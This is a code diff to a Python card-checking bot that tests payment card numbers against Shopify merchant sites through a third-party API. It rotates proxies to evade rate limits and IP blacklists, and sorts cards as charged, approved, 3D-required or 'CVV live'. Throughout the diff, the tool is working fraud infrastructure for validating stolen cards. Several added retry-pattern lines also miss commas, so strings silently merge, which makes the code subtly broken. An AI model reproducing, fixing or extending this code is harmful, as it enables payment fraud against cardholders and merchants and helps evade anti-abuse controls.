@@ -7670,8 +7670,10 @@ async def parse_paypal_response(response_json: dict, elapsed: float, proxy: str 
         "TOO_MANY_REQUESTS", "SERVICE_UNAVAILABLE", "BAD_GATEWAY" "401 AUTH FAILED", "AUTH FAILED", "IP_BLACKLISTED", 
     "ip_blacklisted", "AUTHENTICATION FAILED", "INVALID PROXY",
     "PROXY AUTHENTICATION FAILED", "UNAUTHORIZED", "HTTP 401" "407", "PROXY AUTHENTICATION REQUIRED", "407 PROXY AUTHENTICATION REQUIRED",
-    "401 AUTH FAILED", "AUTH FAILED", "IP_BLACKLISTED", 
-    "ip_blacklisted", "AUTHENTICATION FAILED", "INVALID PROXY",
+    "401 AUTH FAILED", "AUTH FAILED", "IP_BLACKLISTED", "payment token: 403", "Unable to get payment token", 
+    "ip_blacklisted", "AUTHENTICATION FAILED", "INVALID PROXY", "Unable to get payment token",  # <-- ADD THIS
+    "payment token: 403",           # <-- ADD THIS
+    "403"
     "PROXY AUTHENTICATION FAILED", "UNAUTHORIZED", "HTTP 401", "HTTP 407"
     ]
     
@@ -12134,21 +12136,18 @@ class ShopifyAPIPool:
         self.api_stats = {}
         self._lock = asyncio.Lock()
         self.session = None
-        # Track cards that have already been retried
         self.retried_cards = set()
         
         # ============ SITE PERFORMANCE TRACKING ============
-        self.site_performance = {}  # site -> {good_responses, rate_limits, total_checks, last_response, last_time}
-        self.good_sites_cache = []  # Cached list of good sites (sorted by performance)
+        self.site_performance = {}
+        self.good_sites_cache = []
         self.good_sites_cache_time = 0
-        self.good_sites_cache_ttl = 60  # Refresh cache every 60 seconds
+        self.good_sites_cache_ttl = 60
         
-        # Load saved site performance data
         self._load_site_performance()
         
-        # Initialize stats for each API - ALL APIs remain enabled
         for api in self.apis:
-            api["enabled"] = True  # Force enable all APIs
+            api["enabled"] = True
             self.api_stats[api["name"]] = {
                 "total_requests": 0,
                 "successful": 0,
@@ -12157,7 +12156,7 @@ class ShopifyAPIPool:
                 "rate_limited": 0,
                 "avg_response_time": 0,
                 "last_used": 0,
-                "enabled": True,  # Always enabled
+                "enabled": True,
                 "weight": api.get("weight", 1)
             }
         
@@ -12168,7 +12167,6 @@ class ShopifyAPIPool:
         print(f"🔄 Site rotation: GOOD sites first, then normal sites, pure round-robin")
     
     def _load_site_performance(self):
-        """Load site performance data from file"""
         try:
             if Path('site_performance.json').exists():
                 with open('site_performance.json', 'r') as f:
@@ -12182,7 +12180,6 @@ class ShopifyAPIPool:
             self.site_performance = {}
     
     def _save_site_performance(self):
-        """Save site performance data to file"""
         try:
             data = {
                 'sites': self.site_performance,
@@ -12194,7 +12191,6 @@ class ShopifyAPIPool:
             print(f"⚠️ Error saving site performance: {e}")
     
     def _update_site_performance(self, site: str, response_text: str, is_good: bool = False, is_rate_limit: bool = False):
-        """Update site performance tracking"""
         if site not in self.site_performance:
             self.site_performance[site] = {
                 'good_responses': 0,
@@ -12213,7 +12209,6 @@ class ShopifyAPIPool:
         if is_good:
             stats['good_responses'] += 1
             stats['is_good'] = True
-            # Invalidate cache
             self.good_sites_cache_time = 0
             print(f"🌟 [SITE TRACKING] Good response for {site} (total good: {stats['good_responses']})")
         
@@ -12221,34 +12216,23 @@ class ShopifyAPIPool:
             stats['rate_limits'] += 1
             print(f"🚫 [SITE TRACKING] Rate limit #{stats['rate_limits']} for {site}")
             
-            # ============ REMOVE SITE AFTER 20 RATE LIMITS ============
             if stats['rate_limits'] >= 20:
                 print(f"🗑️ [SITE REMOVAL] Site {site} removed due to 20+ rate limits (429 errors)")
                 autosopi_site_manager.remove_site(site, OWNER_ID)
-                # Also remove from performance tracking
                 if site in self.site_performance:
                     del self.site_performance[site]
-                # Invalidate cache
                 self.good_sites_cache_time = 0
         
-        # Auto-save every 50 checks
         if stats['total_checks'] % 50 == 0:
             self._save_site_performance()
     
     def _get_good_sites_prioritized(self) -> list:
-        """
-        Get list of sites that have returned good responses (CARD_DECLINED, OTP_REQUIRED, etc.)
-        Sorted by: most good responses first, then by lowest total checks
-        """
-        # Check cache
         if self.good_sites_cache and (time.time() - self.good_sites_cache_time) < self.good_sites_cache_ttl:
             return self.good_sites_cache
         
-        # Build list of good sites
         good_sites = []
         for site, stats in self.site_performance.items():
             if stats.get('is_good', False) and stats.get('good_responses', 0) > 0:
-                # Check if site is still in rotation
                 if site in autosopi_site_manager.sites:
                     good_sites.append({
                         'site': site,
@@ -12258,15 +12242,10 @@ class ShopifyAPIPool:
                         'last_time': stats.get('last_time', 0)
                     })
         
-        # Sort by: good_count (desc), then total_checks (asc), then last_time (desc)
         good_sites.sort(key=lambda x: (-x['good_count'], x['total_checks'], -x['last_time']))
-        
-        # Extract just site names
         self.good_sites_cache = [s['site'] for s in good_sites]
         self.good_sites_cache_time = time.time()
         
-        # Also update the SiteRotationManager's GOOD sites
-        # This ensures SiteRotationManager has the latest GOOD sites
         if len(self.good_sites_cache) > 0:
             print(f"📊 [SITE PRIORITY] Found {len(self.good_sites_cache)} good sites")
             if len(self.good_sites_cache) > 5:
@@ -12275,25 +12254,16 @@ class ShopifyAPIPool:
         return self.good_sites_cache
     
     def _get_next_site_from_manager(self, tried_sites: list = None) -> Optional[str]:
-        """
-        Get the next site using SiteRotationManager.
-        This ensures pure round-robin rotation across ALL sites.
-        """
         if tried_sites is None:
             tried_sites = []
         
-        # Use SiteRotationManager to get the next site
         site = site_rotation_manager.get_next_site()
         
-        # If site was already tried, skip it and get another
         if site and site in tried_sites:
             print(f"⚠️ [Site Rotation] Site {site} already tried, getting next...")
-            # Force the manager to advance
-            site_rotation_manager.get_next_site()  # This advances the index
-            # Try again
+            site_rotation_manager.get_next_site()
             site = site_rotation_manager.get_next_site()
         
-        # Log which type of site we're using
         if site:
             good_sites = site_rotation_manager._get_good_sites()
             if site in good_sites:
@@ -12305,7 +12275,6 @@ class ShopifyAPIPool:
         return site
     
     async def get_session(self):
-        """Get or create HTTP session"""
         if self.session is None:
             timeout = httpx.Timeout(60.0, connect=15.0, read=50.0)
             self.session = httpx.AsyncClient(
@@ -12317,21 +12286,13 @@ class ShopifyAPIPool:
         return self.session
     
     async def get_next_api(self) -> dict:
-        """
-        Get next API using weighted round-robin
-        ALL APIs are always enabled - NEVER disable
-        """
         async with self._lock:
-            # ALL APIs are always enabled - never disable
             for api in self.apis:
                 api["enabled"] = True
             
             enabled_apis = self.apis.copy()
-            
-            # Calculate total weight
             total_weight = sum(api.get("weight", 1) for api in enabled_apis)
             
-            # Weighted random selection
             rand = random.uniform(0, total_weight)
             cumulative = 0
             
@@ -12343,10 +12304,8 @@ class ShopifyAPIPool:
             else:
                 selected = enabled_apis[0]
             
-            # Update last used time
             self.last_used[selected["name"]] = time.time()
             
-            # Get stats for debug
             stats = self.api_stats.get(selected["name"], {})
             success_rate = (stats.get('successful', 0) / max(stats.get('total_requests', 1), 1)) * 100
             
@@ -12355,34 +12314,22 @@ class ShopifyAPIPool:
             return selected.copy()
     
     def mark_api_result(self, api_name: str, success: bool, response_time: float, is_retryable: bool = False, is_rate_limit: bool = False):
-        """
-        Mark API call result for statistics and adaptive weighting
-        APIs are NEVER disabled - only weights are adjusted
-        """
         for api in self.apis:
             if api["name"] == api_name:
                 if success:
                     api["success_count"] = api.get("success_count", 0) + 1
                     api["last_success"] = time.time()
-                    # Increase weight slightly on success (max 20)
                     api["weight"] = min(20, api.get("weight", 1) + 1)
                 else:
                     api["fail_count"] = api.get("fail_count", 0) + 1
-                    # Decrease weight on failure (min 0.5)
                     api["weight"] = max(0.5, api.get("weight", 1) - 0.5)
                 
-                # Update average response time
                 old_avg = api.get("avg_response_time", 0)
                 total_calls = api.get("success_count", 0) + api.get("fail_count", 0)
                 if total_calls > 0:
                     api["avg_response_time"] = ((old_avg * (total_calls - 1)) + response_time) / total_calls
-                
-                # ============ REMOVED: Auto-disable logic ============
-                # APIs are NEVER disabled, regardless of failures
-                # Only weights are adjusted
                 break
         
-        # Update stats dict
         if api_name in self.api_stats:
             self.api_stats[api_name]["total_requests"] += 1
             if success:
@@ -12401,11 +12348,9 @@ class ShopifyAPIPool:
                 self.api_stats[api_name]["avg_response_time"] = ((old_avg * (total - 1)) + response_time) / total
     
     def _get_card_key(self, card: str, site: str) -> str:
-        """Create a unique key for a card + site combination"""
         return f"{card}|{site}"
     
     def _is_good_response(self, response_text: str) -> bool:
-        """Check if response indicates a GOOD site (working properly)"""
         response_upper = response_text.upper()
         good_indicators = [
             "CARD_DECLINED", "OTP_REQUIRED", "ORDER_PLACED", "3D REQUIRED",
@@ -12418,23 +12363,47 @@ class ShopifyAPIPool:
     async def check_card_with_pool(self, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
         """
         Check a card using the best available API from the pool.
-        Uses SiteRotationManager for proper round-robin site selection.
+        PROXY ROTATION FIX: Each attempt gets a DIFFERENT proxy from the user's pool.
         """
         tried_sites = []
-        tried_proxies = [proxy] if proxy else []
+        tried_proxies = []
         attempt = 0
-        max_attempts = 50  # Max attempts before giving up
+        max_attempts = 50
         
-        # Get proxies for this user
+        # ============ GET FULL LIST OF PROXIES FOR THIS USER ============
         user_proxies = []
         if user_id:
+            # Try autosopi_proxy_tracker first
             if user_id in autosopi_proxy_tracker.working_proxies:
                 user_proxies = autosopi_proxy_tracker.working_proxies.get(user_id, [])
+                print(f"🔌 [PROXY ROTATION] Found {len(user_proxies)} proxies from tracker for user {user_id}")
+            
+            # Fallback to proxy_manager
+            if not user_proxies and user_id in proxy_manager.user_proxies:
+                user_proxies = proxy_manager.user_proxies.get(user_id, [])
+                print(f"🔌 [PROXY ROTATION] Found {len(user_proxies)} proxies from manager for user {user_id}")
+            
+            # Also check global proxy pool
+            if not user_proxies and global_proxy_pool.enabled and global_proxy_pool.proxies:
+                user_proxies = global_proxy_pool.proxies.copy()
+                print(f"🌐 [PROXY ROTATION] Using {len(user_proxies)} global proxies")
+        
+        # If a specific proxy was passed, add it to the list
+        if proxy and proxy not in user_proxies:
+            user_proxies.append(proxy)
+            print(f"🔌 [PROXY ROTATION] Added passed proxy to list")
         
         # Initialize with the provided site if any
         if site:
             tried_sites.append(site)
             print(f"📍 Initial site: {site}")
+        
+        # Store the last used proxy index for rotation
+        if not hasattr(self, '_proxy_index'):
+            self._proxy_index = {}
+        
+        if user_id not in self._proxy_index:
+            self._proxy_index[user_id] = 0
         
         while attempt < max_attempts:
             attempt += 1
@@ -12443,52 +12412,53 @@ class ShopifyAPIPool:
             if attempt == 1 and site:
                 current_site = site
             else:
-                # Get next site from rotation
                 current_site = site_rotation_manager.get_next_site()
                 
-                # If no site available, break
                 if not current_site:
                     print(f"❌ [API POOL] No more sites available after {attempt} attempts")
                     break
                 
-                # Check if site was already tried
                 if current_site in tried_sites:
                     print(f"⚠️ [API POOL] Site {current_site} already tried, getting next...")
-                    # Force advance the rotation
                     site_rotation_manager.get_next_site()
                     current_site = site_rotation_manager.get_next_site()
                     if current_site in tried_sites:
-                        # Still got a tried site, continue loop to get next
                         continue
             
             tried_sites.append(current_site)
             
-            # ============ GET PROXY (ROTATE ON RETRY) ============
+            # ============ GET PROXY WITH ROTATION ============
             current_proxy = None
+            
             if user_proxies:
-                # Rotate through proxies
-                if attempt > 1:
-                    # Try a different proxy on retry
-                    tried_proxies_set = set(tried_proxies)
-                    available_proxies = [p for p in user_proxies if p not in tried_proxies_set]
-                    if available_proxies:
-                        current_proxy = available_proxies[0]
-                        tried_proxies.append(current_proxy)
-                        print(f"🔄 [ATTEMPT #{attempt}] Rotating to NEW proxy: {mask_proxy(current_proxy)}")
-                    elif user_proxies:
-                        # All proxies tried, recycle
-                        current_proxy = user_proxies[attempt % len(user_proxies)]
-                        print(f"🔄 [ATTEMPT #{attempt}] Recycling proxy: {mask_proxy(current_proxy)}")
+                # Get a proxy that hasn't been tried yet
+                available_proxies = [p for p in user_proxies if p not in tried_proxies]
+                
+                if available_proxies:
+                    # Use round-robin index
+                    idx = self._proxy_index.get(user_id, 0) % len(available_proxies)
+                    current_proxy = available_proxies[idx]
+                    self._proxy_index[user_id] = self._proxy_index.get(user_id, 0) + 1
+                    tried_proxies.append(current_proxy)
+                    print(f"🔄 [PROXY ROTATION] #{len(tried_proxies)}/{len(user_proxies)}: {mask_proxy(current_proxy)}")
                 else:
-                    # First attempt: use provided proxy or first available
-                    if proxy:
-                        current_proxy = proxy
-                    elif user_proxies:
-                        current_proxy = user_proxies[0]
-                        tried_proxies.append(current_proxy)
+                    # All proxies tried, reset and rotate
+                    tried_proxies = []
+                    idx = self._proxy_index.get(user_id, 0) % len(user_proxies)
+                    current_proxy = user_proxies[idx]
+                    self._proxy_index[user_id] = self._proxy_index.get(user_id, 0) + 1
+                    tried_proxies.append(current_proxy)
+                    print(f"🔄 [PROXY ROTATION] Reset - using #{idx+1}/{len(user_proxies)}: {mask_proxy(current_proxy)}")
+            else:
+                # Fallback to single proxy or None
+                if proxy:
+                    current_proxy = proxy
+                    print(f"⚠️ [PROXY ROTATION] Using single provided proxy")
+                else:
+                    print(f"⚠️ [PROXY ROTATION] No proxies - direct connection")
             
             # Log the attempt
-            print(f"\n🔍 [API POOL] Attempt {attempt} using: {current_site}")
+            print(f"\n🔍 [API POOL] Attempt {attempt} using site: {current_site}")
             print(f"📊 Sites tried: {len(tried_sites)}/{len(autosopi_site_manager.sites)}")
             
             # Get API for this attempt
@@ -12506,7 +12476,6 @@ class ShopifyAPIPool:
                     self.mark_api_result(api_name, False, elapsed, True)
                     continue
                 
-                # Check if site was removed
                 if result.get("site_removed", False):
                     print(f"🗑️ [API POOL] Site {current_site} was removed")
                     continue
@@ -12520,19 +12489,19 @@ class ShopifyAPIPool:
                 
                 if is_rate_limit:
                     print(f"🚫 [RATE LIMIT] 429 detected for site {current_site}")
-                    # Update site performance (tracking only, no cooldown)
                     self._update_site_performance(current_site, response_text, is_good=False, is_rate_limit=True)
                     self.mark_api_result(api_name, False, elapsed, True, is_rate_limit=True)
-                    # Continue to next site - SiteRotationManager will handle rotation
                     continue
                 
                 # ============ CHECK FOR RETRYABLE ERRORS ============
                 retryable_patterns = [
                     "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN",
-                    "CART FAILED WITH STATUS", "SITE ERROR! STATUS", 
+                    "CART FAILED WITH STATUS", "SITE ERROR! STATUS", "Unable to get payment token", 
                     "MERCHANDISE_EXPECTED_PRICE_MISMATCH", 
-                    "Throttled", "TIMEOUT", "CONNECTION ERROR",
-                    "PROXY DEAD", "SITE DEAD", "SERVER DISCONNECTED",
+                    "Throttled", "TIMEOUT", "CONNECTION ERROR","payment token: 403",
+                    "PROXY DEAD", "SITE DEAD", "SERVER DISCONNECTED","Unable to get payment token",  # <-- ADD THIS
+    "payment token: 403",           # <-- ADD THIS
+    "403"
                     "Invalid JSON", "HTML", "EMPTY_RESPONSE",
                     "NO_SESSION_TOKEN", "SITE DEAD", "PROXY DEAD"
                 ]
@@ -12541,9 +12510,7 @@ class ShopifyAPIPool:
                 
                 if is_retryable:
                     print(f"🔄 [API POOL] Retryable error: {response_text[:100]}")
-                    # Mark as retryable
                     self.mark_api_result(api_name, False, elapsed, True)
-                    # Continue to next site
                     continue
                 
                 # ============ CHECK FOR CHARGED/APPROVED ============
@@ -12551,35 +12518,35 @@ class ShopifyAPIPool:
                 approved_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "CVV LIVE", "INSUFFICIENT"]
                 
                 if any(p in response_upper for p in charged_patterns):
-                    # Success - card charged
                     self._update_site_performance(current_site, response_text, is_good=True, is_rate_limit=False)
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["api_used"] = api_name
                     result["api_attempt"] = attempt
                     result["site_used"] = current_site
-                    print(f"🔥 [API POOL] CHARGED on attempt {attempt} with site {current_site}")
+                    result["proxy_used"] = current_proxy
+                    print(f"🔥 [API POOL] CHARGED on attempt {attempt} with site {current_site}, proxy: {mask_proxy(current_proxy) if current_proxy else 'None'}")
                     return result
                 
                 if any(p in response_upper for p in approved_patterns):
-                    # Success - card approved/live
                     self._update_site_performance(current_site, response_text, is_good=True, is_rate_limit=False)
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["api_used"] = api_name
                     result["api_attempt"] = attempt
                     result["site_used"] = current_site
-                    print(f"✅ [API POOL] APPROVED on attempt {attempt} with site {current_site}")
+                    result["proxy_used"] = current_proxy
+                    print(f"✅ [API POOL] APPROVED on attempt {attempt} with site {current_site}, proxy: {mask_proxy(current_proxy) if current_proxy else 'None'}")
                     return result
                 
                 # ============ CHECK FOR DECLINED (FINAL) ============
                 decline_patterns = ["CARD_DECLINED", "DECLINED", "DO NOT HONOR", "EXPIRED", "GENERIC_ERROR"]
                 
                 if any(p in response_upper for p in decline_patterns):
-                    # Card is declined - final response
                     self._update_site_performance(current_site, response_text, is_good=False, is_rate_limit=False)
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["api_used"] = api_name
                     result["api_attempt"] = attempt
                     result["site_used"] = current_site
+                    result["proxy_used"] = current_proxy
                     result["status"] = "declined"
                     result["status_category"] = "declined"
                     result["status_display"] = "❌ DECLINED"
@@ -12591,6 +12558,7 @@ class ShopifyAPIPool:
                 result["api_used"] = api_name
                 result["api_attempt"] = attempt
                 result["site_used"] = current_site
+                result["proxy_used"] = current_proxy
                 result["status"] = "declined"
                 result["status_category"] = "declined"
                 result["status_display"] = "❌ DECLINED"
@@ -12651,11 +12619,9 @@ class ShopifyAPIPool:
         if site_clean.endswith('/'):
             site_clean = site_clean[:-1]
         
-        # Track if site was removed
         site_removed = False
         
         try:
-            # ALL bladesarksapi endpoints use 'site' parameter
             params = {
                 "site": f"https://{site_clean}",
                 "cc": formatted_card
@@ -12663,7 +12629,6 @@ class ShopifyAPIPool:
             print(f"📤 [BLADESARKS API] Request to: {api['url']}")
             print(f"📤 Params: site=https://{site_clean}, cc={formatted_card[:20]}...")
             
-            # ============ FIX: Better proxy handling ============
             client_kwargs = {
                 'timeout': httpx.Timeout(45.0, connect=15.0, read=40.0),
                 'verify': False,
@@ -12671,30 +12636,24 @@ class ShopifyAPIPool:
                 'limits': httpx.Limits(max_keepalive_connections=5, max_connections=10)
             }
             
-            # Track if proxy is being used
             using_proxy = False
             
-            # Try proxy as client proxy (httpx native)
             if proxy:
                 formatted_proxy = format_proxy(proxy)
                 if formatted_proxy:
-                    # Remove http:// prefix for the proxy URL (httpx handles it)
                     clean_proxy = formatted_proxy
                     try:
                         client_kwargs['proxy'] = clean_proxy
                         using_proxy = True
                         print(f"🔧 Client proxy configured: {mask_proxy(clean_proxy)}")
                         
-                        # Also try adding as parameter with clean format (no http://)
                         clean_for_param = formatted_proxy.replace('http://', '').replace('https://', '')
                         if ':' in clean_for_param and '@' in clean_for_param:
-                            # Parse user:pass@host:port format
                             parts = clean_for_param.split('@')
                             if len(parts) == 2:
                                 auth = parts[0]
                                 hostport = parts[1]
                                 if ':' in auth and ':' in hostport:
-                                    # Format: host:port:user:pass for API
                                     host, port = hostport.split(':', 1)
                                     user, password = auth.split(':', 1)
                                     api_proxy_format = f"{host}:{port}:{user}:{password}"
@@ -12702,34 +12661,28 @@ class ShopifyAPIPool:
                                     print(f"🔧 API proxy param: {mask_proxy(api_proxy_format)}")
                     except Exception as e:
                         print(f"⚠️ Error setting proxy: {e}")
-                        # If proxy fails, try without proxy for this attempt
                         if 'proxy' in client_kwargs:
                             del client_kwargs['proxy']
                         using_proxy = False
                 else:
                     print(f"⚠️ Could not format proxy for client: {mask_proxy(proxy)}")
             
-            # Make the request with proxy-enabled client
             async with httpx.AsyncClient(**client_kwargs) as client:
                 response = await client.get(api["url"], params=params)
             
             elapsed = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
             print(f"📥 Response time: {elapsed:.2f}s | Status: {response.status_code}")
             
-            # ============ FIX: Handle 407 Proxy Authentication Required ============
             if response.status_code == 407:
                 print(f"🔐 [PROXY AUTH FAILED] 407 - Proxy authentication failed: {mask_proxy(proxy) if proxy else 'None'}")
-                # Mark the proxy as failed
                 if proxy and user_id:
                     if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
                         autosopi_proxy_tracker.record_proxy_result(user_id, proxy, "407 Proxy Authentication Required", elapsed)
-                    # Remove this proxy from working list
                     if user_id in autosopi_proxy_tracker.working_proxies:
                         if proxy in autosopi_proxy_tracker.working_proxies[user_id]:
                             autosopi_proxy_tracker.working_proxies[user_id].remove(proxy)
                             print(f"🗑️ Removed proxy from working list: {mask_proxy(proxy)}")
                 
-                # Return retryable error so it tries next proxy
                 return {
                     "status": "error",
                     "result": "PROXY_AUTH_FAILED",
@@ -12740,7 +12693,6 @@ class ShopifyAPIPool:
                 }
             
             if response.status_code != 200:
-                # Check if it's a retryable status code
                 if response.status_code in [408, 429, 500, 502, 503, 504]:
                     return {
                         "status": "error",
@@ -12759,13 +12711,11 @@ class ShopifyAPIPool:
                     "elapsed": elapsed
                 }
             
-            # Parse JSON response
             try:
                 data = response.json()
                 print(f"✅ Response: {json.dumps(data, indent=2)[:500]}")
             except json.JSONDecodeError as e:
                 print(f"⚠️ JSON parse error: {e}")
-                # Check if response is HTML (site error page)
                 if response.text and ('<html' in response.text[:100] or '<!DOCTYPE' in response.text[:100]):
                     return {
                         "status": "error",
@@ -12785,7 +12735,6 @@ class ShopifyAPIPool:
                     "elapsed": elapsed
                 }
             
-            # Extract response data
             response_text = data.get("Response", data.get("response", data.get("message", data.get("status", "UNKNOWN"))))
             gateway = data.get("Gateway", data.get("gateway", data.get("Gate", "Shopify Payments")))
             price = data.get("Price", data.get("price", data.get("amount", "0.00")))
@@ -12793,7 +12742,6 @@ class ShopifyAPIPool:
             
             response_upper = response_text.upper()
             
-            # ============ CHECK FOR RATE LIMIT (429) ============
             if "429" in response_text or "Site Error! Status: 429" in response_text:
                 print(f"🚫 [RATE LIMIT] Rate limit detected on proxy: {mask_proxy(proxy)}")
                 if proxy and user_id:
@@ -12802,7 +12750,6 @@ class ShopifyAPIPool:
                     if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
                         autosopi_proxy_tracker.record_proxy_result(user_id, proxy, response_text, elapsed)
                 
-                # Update site performance (tracking only)
                 self._update_site_performance(site_clean, response_text, is_good=False, is_rate_limit=True)
                 
                 return {
@@ -12820,7 +12767,6 @@ class ShopifyAPIPool:
                     "is_rate_limit": True
                 }
             
-            # ============ RECORD GOOD SITE RESPONSES ============
             good_indicators = [
                 "CARD_DECLINED", "OTP_REQUIRED", "3D REQUIRED",
                 "OTP", "3D", "CVV LIVE", "INSUFFICIENT FUNDS",
@@ -12837,7 +12783,6 @@ class ShopifyAPIPool:
                 site_quality_tracker.record_response(site_clean, response_text, "good", price_float)
                 self._update_site_performance(site_clean, response_text, is_good=True, is_rate_limit=False)
             
-            # ============ CHECK FOR SITE REMOVAL ERRORS ============
             for removal_error in SITE_REMOVAL_ERRORS:
                 if removal_error.upper() in response_upper:
                     if site_quality_tracker.is_good_site(site_clean) or self.site_performance.get(site_clean, {}).get('is_good', False):
@@ -12862,7 +12807,6 @@ class ShopifyAPIPool:
                         "site": site_clean
                     }
             
-            # ============ CARD DECLINE PATTERNS ============
             real_decline_patterns = [
                 "CARD_DECLINED", "DECLINED", "INSUFFICIENT FUNDS", 
                 "EXPIRED CARD", "DO NOT HONOR", "LOST CARD", "STOLEN CARD",
@@ -12897,7 +12841,6 @@ class ShopifyAPIPool:
                     "api_name": api["name"]
                 }
             
-            # ============ CHECK FOR CHARGED ============
             if any(x in response_upper for x in ["CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "💎"]):
                 print(f"🔥 [API] CHARGED detected!")
                 return {
@@ -12914,7 +12857,6 @@ class ShopifyAPIPool:
                     "api_name": api["name"]
                 }
             
-            # ============ CHECK FOR 3D/OTP ============
             if any(x in response_upper for x in ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]):
                 print(f"🔐 [API] 3D REQUIRED detected!")
                 return {
@@ -12931,7 +12873,6 @@ class ShopifyAPIPool:
                     "api_name": api["name"]
                 }
             
-            # ============ CHECK FOR INSUFFICIENT FUNDS ============
             if "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                 print(f"💰 [API] INSUFFICIENT FUNDS detected!")
                 return {
@@ -12948,7 +12889,6 @@ class ShopifyAPIPool:
                     "api_name": api["name"]
                 }
             
-            # ============ CHECK FOR CVV LIVE ============
             if "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
                 print(f"✅ [API] CVV LIVE detected!")
                 return {
@@ -12965,17 +12905,18 @@ class ShopifyAPIPool:
                     "api_name": api["name"]
                 }
             
-            # ============ RETRYABLE ERRORS ============
             retryable_patterns = [
                 "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN",
                 "DECISION_RULE_BLOCK", "No products under $3 found!", "<b>No products under $3 found!</b>",
                 "CART FAILED WITH STATUS 422", "CART FAILED WITH STATUS 429",
                 "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",
                 "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
-                "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
+                "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED","payment token: 403","Unable to get payment token", 
                 "INVALID_PAYMENT_METHOD", "Site not supported",
                 "NO VARIANTS", "Not Shopify!", "No Valid Products",
-                "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT",
+                "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT","Unable to get payment token",  # <-- ADD THIS
+    "payment token: 403",           # <-- ADD THIS
+    "403"
                 "SUBMIT REJECTED", "TOKENIZE_FAIL", "INVALID JSON RESPONSE",
                 "EMPTY_RESPONSE", "NO_SESSION_TOKEN", "PAYMENTS_METHOD",
                 "PAYMENT_METHOD_NOT_ACCEPTED",
@@ -13007,7 +12948,6 @@ class ShopifyAPIPool:
                     "api_name": api["name"]
                 }
             
-            # Default: treat as declined
             print(f"❌ [API] Unknown response - treating as DECLINED")
             return {
                 "status": "declined",
@@ -13045,13 +12985,11 @@ class ShopifyAPIPool:
             }
     
     def get_site_performance_stats(self) -> str:
-        """Get formatted site performance statistics"""
         if not self.site_performance:
             return "📊 No site performance data available."
         
         result = "📊 <b>Site Performance Statistics</b>\n\n"
         
-        # Sort by good responses (desc)
         sorted_sites = sorted(
             self.site_performance.items(),
             key=lambda x: (x[1].get('good_responses', 0), -x[1].get('rate_limits', 0)),
@@ -13077,13 +13015,12 @@ class ShopifyAPIPool:
         return result
     
     def get_stats(self) -> str:
-        """Get formatted statistics for all APIs"""
         result = "📊 <b>Shopify API Pool Statistics</b>\n\n"
         
         for api in self.apis:
             name = api["name"]
             stats = self.api_stats.get(name, {})
-            enabled = "✅"  # Always enabled
+            enabled = "✅"
             total = stats.get('total_requests', 0)
             successful = stats.get('successful', 0)
             retryable = stats.get('retryable', 0)
@@ -13101,14 +13038,12 @@ class ShopifyAPIPool:
             result += f"   ├─ Avg Time: {stats.get('avg_response_time', 0):.2f}s\n"
             result += f"   └─ Weight: {api.get('weight', 1):.1f}\n\n"
         
-        # Add site rotation status
         result += "\n" + site_rotation_manager.get_stats()
         result += "\n\n" + self.get_site_performance_stats()
         
         return result
     
     async def close(self):
-        """Close HTTP session"""
         if self.session:
             await self.session.aclose()
             self.session = None
